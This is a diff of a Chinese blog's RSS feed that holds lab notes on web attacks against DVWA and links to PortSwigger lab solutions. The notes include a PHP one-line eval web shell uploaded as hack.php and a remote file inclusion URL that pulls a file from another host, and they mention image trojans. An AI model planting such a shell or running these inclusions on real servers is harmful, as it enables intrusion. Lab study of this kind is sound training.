@@ -1,175 +1,329 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Web on nRevery's Blog</title><link>https://blog.nrevery.cn/categories/web/</link><description>Recent content in Web on nRevery's Blog</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><copyright>nRevery</copyright><lastBuildDate>Sun, 02 Jun 2024 19:20:28 +0800</lastBuildDate><atom:link href="https://blog.nrevery.cn/categories/web/index.xml" rel="self" type="application/rss+xml"/><item><title>Web入门</title><link>https://blog.nrevery.cn/p/web%E5%85%A5%E9%97%A8/</link><pubDate>Sun, 02 Jun 2024 19:20:28 +0800</pubDate><guid>https://blog.nrevery.cn/p/web%E5%85%A5%E9%97%A8/</guid><description>&lt;h2 id="环境">环境&lt;/h2>
-&lt;h3 id="burp-suite">burp suite&lt;/h3>
-&lt;p>吾爱破解
-&lt;a class="link" href="https://www.52pojie.cn/thread-1544866-1-1.html" target="_blank" rel="noopener"
->https://www.52pojie.cn/thread-1544866-1-1.html&lt;/a>&lt;/p>
-&lt;h3 id="容器">容器&lt;/h3>
-&lt;p>小皮、dvwa
-&lt;a class="link" href="https://blog.csdn.net/Stupid__Angel/article/details/127060860" target="_blank" rel="noopener"
->https://blog.csdn.net/Stupid__Angel/article/details/127060860&lt;/a>&lt;br>
-&lt;a class="link" href="https://blog.csdn.net/m0_60884805/article/details/127086871" target="_blank" rel="noopener"
->https://blog.csdn.net/m0_60884805/article/details/127086871&lt;/a>&lt;br>
-若小皮的mysql和本机mysql冲突，可用如下方法解决：&lt;br>
-&lt;a class="link" href="https://blog.csdn.net/weixin_46104490/article/details/121036597" target="_blank" rel="noopener"
->https://blog.csdn.net/weixin_46104490/article/details/121036597&lt;/a>&lt;/p>
-&lt;h3 id="一些问题">一些问题&lt;/h3>
-&lt;p>（firefox上）&lt;/p>
-&lt;ol>
-&lt;li>burp抓不到包
-解决burp浏览器抓包提示有软件正在阻止 Firefox 安全地连接至此网站，PortSwigger CA 造成……的问题&lt;br>
-&lt;a class="link" href="https://blog.csdn.net/htsssss/article/details/128469844" target="_blank" rel="noopener"
->https://blog.csdn.net/htsssss/article/details/128469844&lt;/a>&lt;/li>
-&lt;li>抓不到本地的包，其他正常
-&lt;a class="link" href="https://blog.csdn.net/songling515010475/article/details/107269583" target="_blank" rel="noopener"
->https://blog.csdn.net/songling515010475/article/details/107269583&lt;/a>&lt;br>
-&lt;a class="link" href="https://blog.csdn.net/m0_47470899/article/details/119298514" target="_blank" rel="noopener"
->https://blog.csdn.net/m0_47470899/article/details/119298514&lt;/a>&lt;/li>
-&lt;li>不能翻墙
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>Web on nRevery&#39;s Blog</title>
+        <link>https://blog.nrevery.cn/categories/web/</link>
+        <description>Recent content in Web on nRevery&#39;s Blog</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>zh-cn</language>
+        <copyright>nRevery</copyright>
+        <lastBuildDate>Sun, 02 Jun 2024 19:20:28 +0800</lastBuildDate><atom:link href="https://blog.nrevery.cn/categories/web/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>Web入门</title>
+        <link>https://blog.nrevery.cn/p/web%E5%85%A5%E9%97%A8/</link>
+        <pubDate>Sun, 02 Jun 2024 19:20:28 +0800</pubDate>
+        
+        <guid>https://blog.nrevery.cn/p/web%E5%85%A5%E9%97%A8/</guid>
+        <description>&lt;h2 id=&#34;环境&#34;&gt;环境&lt;/h2&gt;
+&lt;h3 id=&#34;burp-suite&#34;&gt;burp suite&lt;/h3&gt;
+&lt;p&gt;吾爱破解
+&lt;a class=&#34;link&#34; href=&#34;https://www.52pojie.cn/thread-1544866-1-1.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://www.52pojie.cn/thread-1544866-1-1.html&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;容器&#34;&gt;容器&lt;/h3&gt;
+&lt;p&gt;小皮、dvwa
+&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/Stupid__Angel/article/details/127060860&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://blog.csdn.net/Stupid__Angel/article/details/127060860&lt;/a&gt;&lt;br&gt;
+&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/m0_60884805/article/details/127086871&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://blog.csdn.net/m0_60884805/article/details/127086871&lt;/a&gt;&lt;br&gt;
+若小皮的mysql和本机mysql冲突，可用如下方法解决：&lt;br&gt;
+&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/weixin_46104490/article/details/121036597&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://blog.csdn.net/weixin_46104490/article/details/121036597&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;一些问题&#34;&gt;一些问题&lt;/h3&gt;
+&lt;p&gt;（firefox上）&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;burp抓不到包
+解决burp浏览器抓包提示有软件正在阻止 Firefox 安全地连接至此网站，PortSwigger CA 造成……的问题&lt;br&gt;
+&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/htsssss/article/details/128469844&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://blog.csdn.net/htsssss/article/details/128469844&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;抓不到本地的包，其他正常
+&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/songling515010475/article/details/107269583&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://blog.csdn.net/songling515010475/article/details/107269583&lt;/a&gt;&lt;br&gt;
+&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/m0_47470899/article/details/119298514&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://blog.csdn.net/m0_47470899/article/details/119298514&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;不能翻墙
 代理链条
 查看clash代理端口（clash-general-port）,如7890
 burp suite-代理-代理设置-network下的connections-上游代理服务器-add
-&lt;img src="https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20240613182717.png"
-loading="lazy"
->&lt;/li>
-&lt;/ol>
-&lt;h2 id="学习记录">学习记录&lt;/h2>
-&lt;h3 id="暴力破解">暴力破解&lt;/h3>
-&lt;p>http://ip/DVWA-master/setup.php&lt;br>
-ip可以写127.0.0.1，如果抓包不成功改成本机ip&lt;br>
-DVWA Security改成low，Brute Force里登录&lt;br>
-&lt;img src="https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20240602192914.png"
-loading="lazy"
->&lt;/p>
-&lt;p>对于“length”长度不同的，表示该页面存在SQL注入漏洞，或者是找到的正确参数。&lt;br>
-&lt;img src="https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20240602200116.png"
-loading="lazy"
->&lt;/p>
-&lt;h3 id="命令注入">命令注入&lt;/h3>
-&lt;p>正常
-&lt;img src="https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20240602200944.png"
-loading="lazy"
->&lt;/p>
-&lt;p>利用PHP的特性注入
-&lt;img src="https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20240602200904.png"
-loading="lazy"
->&lt;/p>
-&lt;h3 id="跨站请求伪造">跨站请求伪造&lt;/h3>
-&lt;p>XSS在客户端执行脚本，CSRF则是在WEB应用中执行操作&lt;br>
-利用了web中用户身份验证的一个漏洞：简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。&lt;br>
-&lt;img src="https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20240602230441.png"
-loading="lazy"
->&lt;br>
-&lt;img src="https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20240602230516.png"
-loading="lazy"
->&lt;/p>
-&lt;h3 id="文件包含">文件包含&lt;/h3>
-&lt;p>本地文件包含漏洞：通过动态变量的方式引入需要包含的文件时，用户对这个变量可控，服务端又没有做合理的校验，或者校验被绕过&lt;br>
-例如：http://xxx/xxx/xxx/?page=test.php&lt;br>
-下图可以看到绝对路径暴露&lt;br>
-&lt;img src="https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20240602202932.png"
-loading="lazy"
->&lt;br>
-远程文件包含漏洞。&lt;br>
-例如：http://xxx/xxx/xxx/?page=http://aaa/bbb/ccc/test.php&lt;br>
-假设可以访问服务器192.168.192.1，则可以成功执行test.txt&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://www.dvwa-test.com/vulnerabilities/fi/?page=http://192.168.192.1/test.txt
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>通过URL编码增加隐蔽性&lt;br>
-&lt;img src="https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20240602204637.png"
-loading="lazy"
->&lt;/p>
-&lt;h3 id="文件上传">文件上传&lt;/h3>
-&lt;p>下载中国蚁剑
-&lt;a class="link" href="https://github.com/AntSwordProject/" target="_blank" rel="noopener"
->https://github.com/AntSwordProject/&lt;/a>&lt;br>
-下载本体和加载器，下载zip有安全提示，改成git clone的方式即可&lt;br>
-注意关闭蚁剑并没有终止进程，需手工结束任务&lt;br>
-上传test.php,内容如下：&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">phpinfo&lt;/span>&lt;span class="p">();&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
-&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20240602212716.png"
-loading="lazy"
->&lt;br>
-可如下运行：&lt;br>
-&lt;img src="https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20240602213325.png"
-loading="lazy"
->&lt;/p>
-&lt;p>一句话木马以hack.php上传：&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span> &lt;span class="o">@&lt;/span>&lt;span class="k">eval&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;pass&amp;#39;&lt;/span>&lt;span class="p">]);&lt;/span>&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
-&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20240602220022.png"
-loading="lazy"
->&lt;br>
-&lt;img src="https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20240602220135.png"
-loading="lazy"
->&lt;br>
-安全设置为medium，看到文件类型受到限制&lt;br>
-&lt;img src="https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20240602220333.png"
-loading="lazy"
->&lt;br>
-test.png仅修改扩展名就可以上传成功，且正常访问&lt;br>
-&lt;img src="https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20240602220927.png"
-loading="lazy"
->&lt;br>
-hack.png也能上传成功但不能访问&lt;br>
-&lt;img src="https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20240602221330.png"
-loading="lazy"
->&lt;br>
-抓包&lt;br>
-&lt;img src="https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20240602225450.png"
-loading="lazy"
->&lt;br>
-图片木马&lt;br>
-&lt;img src="https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20240602230116.png"
-loading="lazy"
->&lt;/p>
-&lt;h3 id="sql注入">SQL注入&lt;/h3>
-&lt;p>&lt;img src="https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/5bc123563dca8005e859acde7809710.png"
-loading="lazy"
->&lt;br>
-&lt;img src="https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/3e3eb441f4b84ffbe9a5d67fdbd3ffe.png"
-loading="lazy"
->&lt;br>
-&lt;img src="https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20240602230933.png"
-loading="lazy"
->&lt;br>
-&lt;img src="https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20240602231024.png"
-loading="lazy"
->&lt;br>
-&lt;img src="https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20240602231114.png"
-loading="lazy"
->&lt;br>
-&lt;img src="https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20240602232614.png"
-loading="lazy"
->&lt;br>
-&lt;img src="https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20240602230957.png"
-loading="lazy"
->&lt;/p></description></item><item><title>Portswigger 靶场练习</title><link>https://blog.nrevery.cn/p/portswigger-%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/</link><pubDate>Wed, 01 May 2024 21:32:33 +0800</pubDate><guid>https://blog.nrevery.cn/p/portswigger-%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/</guid><description>&lt;h2 id="sql-injection">SQL injection&lt;/h2>
-&lt;p>题解参考：
-&lt;a class="link" href="https://www.cnblogs.com/yii-ling/p/17011963.html" target="_blank" rel="noopener"
->https://www.cnblogs.com/yii-ling/p/17011963.html&lt;/a>
-&lt;a class="link" href="https://www.cnblogs.com/Zeker62/category/2017613.html" target="_blank" rel="noopener"
->https://www.cnblogs.com/Zeker62/category/2017613.html&lt;/a>
-&lt;a class="link" href="https://developer.aliyun.com/article/1158593" target="_blank" rel="noopener"
->https://developer.aliyun.com/article/1158593&lt;/a>&lt;/p>
-&lt;h2 id="cross-site-scripting">Cross-site scripting&lt;/h2>
-&lt;p>题解参考：
-&lt;a class="link" href="https://www.cnblogs.com/zhoujinxuan/p/16268862.html" target="_blank" rel="noopener"
->https://www.cnblogs.com/zhoujinxuan/p/16268862.html&lt;/a>
-&lt;a class="link" href="https://blog.csdn.net/qq_33168924/article/details/135657809" target="_blank" rel="noopener"
->https://blog.csdn.net/qq_33168924/article/details/135657809&lt;/a>
-&lt;a class="link" href="https://www.ddosi.org/portswigger-xss-lab/" target="_blank" rel="noopener"
->https://www.ddosi.org/portswigger-xss-lab/&lt;/a>&lt;/p>
-&lt;h2 id="cross-site-request-forgery-csrf">Cross-site request forgery (CSRF)&lt;/h2>
-&lt;p>题解参考：
-&lt;a class="link" href="https://www.cnblogs.com/yii-ling/p/17043759.html" target="_blank" rel="noopener"
->https://www.cnblogs.com/yii-ling/p/17043759.html&lt;/a>
-&lt;a class="link" href="https://blog.csdn.net/m0_67978351/article/details/129054284" target="_blank" rel="noopener"
->https://blog.csdn.net/m0_67978351/article/details/129054284&lt;/a>&lt;/p>
-&lt;h2 id="cross-origin-resource-sharing-cors">Cross-origin resource sharing (CORS)&lt;/h2>
-&lt;p>题解参考：
-&lt;a class="link" href="https://www.anquanke.com/post/id/246029" target="_blank" rel="noopener"
->https://www.anquanke.com/post/id/246029&lt;/a>
-&lt;a class="link" href="https://blog.csdn.net/bin789456/article/details/123403395" target="_blank" rel="noopener"
->https://blog.csdn.net/bin789456/article/details/123403395&lt;/a>
-&lt;a class="link" href="https://developer.aliyun.com/article/1159316" target="_blank" rel="noopener"
->https://developer.aliyun.com/article/1159316&lt;/a>&lt;/p></description></item></channel></rss>
+&lt;img src=&#34;https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20240613182717.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;学习记录&#34;&gt;学习记录&lt;/h2&gt;
+&lt;h3 id=&#34;暴力破解&#34;&gt;暴力破解&lt;/h3&gt;
+&lt;p&gt;http://ip/DVWA-master/setup.php&lt;br&gt;
+ip可以写127.0.0.1，如果抓包不成功改成本机ip&lt;br&gt;
+DVWA Security改成low，Brute Force里登录&lt;br&gt;
+&lt;img src=&#34;https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20240602192914.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;对于“length”长度不同的，表示该页面存在SQL注入漏洞，或者是找到的正确参数。&lt;br&gt;
+&lt;img src=&#34;https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20240602200116.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;命令注入&#34;&gt;命令注入&lt;/h3&gt;
+&lt;p&gt;正常
+&lt;img src=&#34;https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20240602200944.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;利用PHP的特性注入
+&lt;img src=&#34;https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20240602200904.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;跨站请求伪造&#34;&gt;跨站请求伪造&lt;/h3&gt;
+&lt;p&gt;XSS在客户端执行脚本，CSRF则是在WEB应用中执行操作&lt;br&gt;
+利用了web中用户身份验证的一个漏洞：简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。&lt;br&gt;
+&lt;img src=&#34;https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20240602230441.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;br&gt;
+&lt;img src=&#34;https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20240602230516.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;文件包含&#34;&gt;文件包含&lt;/h3&gt;
+&lt;p&gt;本地文件包含漏洞：通过动态变量的方式引入需要包含的文件时，用户对这个变量可控，服务端又没有做合理的校验，或者校验被绕过&lt;br&gt;
+例如：http://xxx/xxx/xxx/?page=test.php&lt;br&gt;
+下图可以看到绝对路径暴露&lt;br&gt;
+&lt;img src=&#34;https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20240602202932.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;br&gt;
+远程文件包含漏洞。&lt;br&gt;
+例如：http://xxx/xxx/xxx/?page=http://aaa/bbb/ccc/test.php&lt;br&gt;
+假设可以访问服务器192.168.192.1，则可以成功执行test.txt&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://www.dvwa-test.com/vulnerabilities/fi/?page=http://192.168.192.1/test.txt  
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;通过URL编码增加隐蔽性&lt;br&gt;
+&lt;img src=&#34;https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20240602204637.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;文件上传&#34;&gt;文件上传&lt;/h3&gt;
+&lt;p&gt;下载中国蚁剑
+&lt;a class=&#34;link&#34; href=&#34;https://github.com/AntSwordProject/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://github.com/AntSwordProject/&lt;/a&gt;&lt;br&gt;
+下载本体和加载器，下载zip有安全提示，改成git clone的方式即可&lt;br&gt;
+注意关闭蚁剑并没有终止进程，需手工结束任务&lt;br&gt;
+上传test.php,内容如下：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;phpinfo&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20240602212716.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;br&gt;
+可如下运行：&lt;br&gt;
+&lt;img src=&#34;https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20240602213325.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;一句话木马以hack.php上传：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;eval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;pass&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20240602220022.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;br&gt;
+&lt;img src=&#34;https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20240602220135.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;br&gt;
+安全设置为medium，看到文件类型受到限制&lt;br&gt;
+&lt;img src=&#34;https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20240602220333.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;br&gt;
+test.png仅修改扩展名就可以上传成功，且正常访问&lt;br&gt;
+&lt;img src=&#34;https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20240602220927.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;br&gt;
+hack.png也能上传成功但不能访问&lt;br&gt;
+&lt;img src=&#34;https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20240602221330.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;br&gt;
+抓包&lt;br&gt;
+&lt;img src=&#34;https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20240602225450.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;br&gt;
+图片木马&lt;br&gt;
+&lt;img src=&#34;https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20240602230116.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;sql注入&#34;&gt;SQL注入&lt;/h3&gt;
+&lt;p&gt;&lt;img src=&#34;https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/5bc123563dca8005e859acde7809710.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;br&gt;
+&lt;img src=&#34;https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/3e3eb441f4b84ffbe9a5d67fdbd3ffe.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;br&gt;
+&lt;img src=&#34;https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20240602230933.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;br&gt;
+&lt;img src=&#34;https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20240602231024.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;br&gt;
+&lt;img src=&#34;https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20240602231114.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;br&gt;
+&lt;img src=&#34;https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20240602232614.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;br&gt;
+&lt;img src=&#34;https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20240602230957.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Portswigger 靶场练习</title>
+        <link>https://blog.nrevery.cn/p/portswigger-%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/</link>
+        <pubDate>Wed, 01 May 2024 21:32:33 +0800</pubDate>
+        
+        <guid>https://blog.nrevery.cn/p/portswigger-%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/</guid>
+        <description>&lt;h2 id=&#34;sql-injection&#34;&gt;SQL injection&lt;/h2&gt;
+&lt;p&gt;题解参考：
+&lt;a class=&#34;link&#34; href=&#34;https://www.cnblogs.com/yii-ling/p/17011963.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://www.cnblogs.com/yii-ling/p/17011963.html&lt;/a&gt;
+&lt;a class=&#34;link&#34; href=&#34;https://www.cnblogs.com/Zeker62/category/2017613.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://www.cnblogs.com/Zeker62/category/2017613.html&lt;/a&gt;
+&lt;a class=&#34;link&#34; href=&#34;https://developer.aliyun.com/article/1158593&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://developer.aliyun.com/article/1158593&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;cross-site-scripting&#34;&gt;Cross-site scripting&lt;/h2&gt;
+&lt;p&gt;题解参考：
+&lt;a class=&#34;link&#34; href=&#34;https://www.cnblogs.com/zhoujinxuan/p/16268862.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://www.cnblogs.com/zhoujinxuan/p/16268862.html&lt;/a&gt;
+&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/qq_33168924/article/details/135657809&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://blog.csdn.net/qq_33168924/article/details/135657809&lt;/a&gt;
+&lt;a class=&#34;link&#34; href=&#34;https://www.ddosi.org/portswigger-xss-lab/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://www.ddosi.org/portswigger-xss-lab/&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;cross-site-request-forgery-csrf&#34;&gt;Cross-site request forgery (CSRF)&lt;/h2&gt;
+&lt;p&gt;题解参考：
+&lt;a class=&#34;link&#34; href=&#34;https://www.cnblogs.com/yii-ling/p/17043759.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://www.cnblogs.com/yii-ling/p/17043759.html&lt;/a&gt;
+&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/m0_67978351/article/details/129054284&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://blog.csdn.net/m0_67978351/article/details/129054284&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;cross-origin-resource-sharing-cors&#34;&gt;Cross-origin resource sharing (CORS)&lt;/h2&gt;
+&lt;p&gt;题解参考：
+&lt;a class=&#34;link&#34; href=&#34;https://www.anquanke.com/post/id/246029&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://www.anquanke.com/post/id/246029&lt;/a&gt;
+&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/bin789456/article/details/123403395&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://blog.csdn.net/bin789456/article/details/123403395&lt;/a&gt;
